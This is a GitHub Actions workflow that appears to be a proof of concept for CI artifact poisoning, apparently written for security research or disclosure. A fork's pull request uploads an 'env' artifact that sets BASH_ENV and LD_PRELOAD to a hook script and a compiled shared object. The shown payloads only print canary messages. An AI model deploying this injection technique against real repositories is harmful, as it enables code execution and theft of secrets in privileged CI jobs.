name: Validate

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # ---------------------------------------------------------------------
      # THE ONLY CHANGE A FORK HAS TO MAKE.
      # For a `pull_request` event GitHub runs the workflow file from the pull
      # request's own merge ref, so this file is authored by the fork. The
      # artifact name the privileged consumer selects ("env") and every byte
      # inside it are therefore chosen by the pull request author.
      # Contents are a console.log and two environment variables. No secret is
      # read, written, or exfiltrated.
      # ---------------------------------------------------------------------
      - name: Save PR number
        if: github.event_name == 'pull_request'
        run: |
          mkdir -p ./env
          W=/home/runner/work/ci-artifact-env-poc/ci-artifact-env-poc
          cat > ./env/env <<EOT
          PR_NUMBER=${{ github.event.number }}
          POC_CANARY=fourth-pr-ld-preload
          BASH_ENV=${W}/poc-bashenv.sh
          LD_PRELOAD=${W}/poc.so
          EOT
          cat > ./env/poc-bashenv.sh <<'EOT'
          echo "[poc-bashenv] bash hook fired"
          EOT
          cat > /tmp/poc.c <<'EOT'
          #include <stdio.h>
          __attribute__((constructor)) static void poc(void) {
            fprintf(stderr, "[poc-ldpreload] shared object loaded into this process\n");
          }
          EOT
          gcc -shared -fPIC -o ./env/poc.so /tmp/poc.c
          echo "--- artifact contents the fork is about to upload ---"
          cat ./env/env
          ls -la ./env

      - uses: actions/upload-artifact@v4
        with:
          name: env
          path: env/
